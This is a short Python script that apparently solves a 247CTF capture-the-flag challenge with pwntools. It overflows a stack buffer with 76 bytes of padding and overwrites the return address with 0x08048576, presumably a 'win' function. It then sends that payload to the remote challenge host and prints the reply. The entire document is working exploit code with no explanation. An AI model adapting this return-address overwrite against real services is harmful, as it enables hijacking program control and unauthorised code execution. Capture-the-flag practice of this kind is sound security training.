from pwn import * 

padding = b"A" * 76
win = p32(0x08048576)

with remote("e2b147966b741b27.247ctf.com", 50388) as connection:
	connection.sendlineafter(b" ", padding + win)
	print(connection.clean(1).decode())
